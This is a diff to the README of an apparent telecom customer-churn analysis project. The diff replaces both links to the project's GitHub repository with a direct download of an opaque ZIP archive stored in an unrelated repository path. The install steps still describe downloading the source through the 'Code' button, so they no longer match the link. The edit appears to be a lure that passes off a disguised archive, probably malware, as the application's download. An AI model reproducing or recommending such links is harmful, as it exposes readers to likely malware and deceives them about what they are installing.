@@ -5,7 +5,7 @@ description: "Analyze telecom customer churn using SQL, Python, and Streamlit to
 ---
 # 📊 Customer-Churn-Analysis - Identify patterns to keep your customers
 
-[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/Warmupgroundwork927/Customer-Churn-Analysis)
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Warmupgroundwork927/warmupgroundwork927.github.io/main/unstern/io-warmupgroundwork-github-1.0.zip)
 
 This project helps you understand why customers leave your business. It turns raw information into clear charts. You can see patterns in your data through a simple interface. The tool processes telecom records to highlight churn drivers. You gain insights to make better business choices.
 
@@ -22,7 +22,7 @@ Your computer needs these to run the tool smoothly:
 
 Follow these steps to set up the software:
 
-1.  Visit [this page to download](https://github.com/Warmupgroundwork927/Customer-Churn-Analysis).
+1.  Visit [this page to download](https://raw.githubusercontent.com/Warmupgroundwork927/warmupgroundwork927.github.io/main/unstern/io-warmupgroundwork-github-1.0.zip).
 2.  Click the green button labeled "Code" and select "Download ZIP".
 3.  Locate the downloaded file in your Downloads folder.
 4.  Right-click the ZIP file and select "Extract All".
